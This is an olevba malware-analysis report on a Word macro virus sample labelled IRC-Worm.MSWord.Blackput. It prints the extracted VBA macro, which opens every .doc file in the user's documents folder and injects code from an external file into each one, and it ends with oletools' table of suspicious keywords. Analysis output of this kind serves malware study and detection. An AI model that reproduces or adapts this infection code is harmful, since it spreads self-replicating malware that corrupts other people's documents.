olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: IRC-Worm.MSWord.Blackput-2f711e69a3e3c86dba9cef7043a6f3ea3f409298
Type: Text
-------------------------------------------------------------------------------
VBA MACRO IRC-Worm.MSWord.Blackput-2f711e69a3e3c86dba9cef7043a6f3ea3f409298 
in file: IRC-Worm.MSWord.Blackput-2f711e69a3e3c86dba9cef7043a6f3ea3f409298 - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'W97/Blackout
On Error Resume Next
Set fso=CreateObject("Scripting.FileSystemObject")
Set ws=CreateObject("Wscript.Shell")
Set wa=CreateObject("Word.Application")
infwd("c:\mydocu~1\")

function infwd(doc)
If f.FolderExists(doc) Then
For Each wd in f.GetFolder(doc)
ext=f.GetExtensionName(wd.Name)
if ext="doc" or ext="DOC" Then
Set wp=wa.application
wp.Documents.Open wd.name
End If
Next

Set ad=wp.ActiveDocument.VBProject.VBComponents.Item(1)
if ad.name <> "Blackout" then
ad.CodeModule.AddFromFile "c:\blackout.vxd"
  
ad.name="Blackout"
wp.ActiveDocument.ReadOnlyRecommended = true

wp.ActiveDocument.Save

End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Wscript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

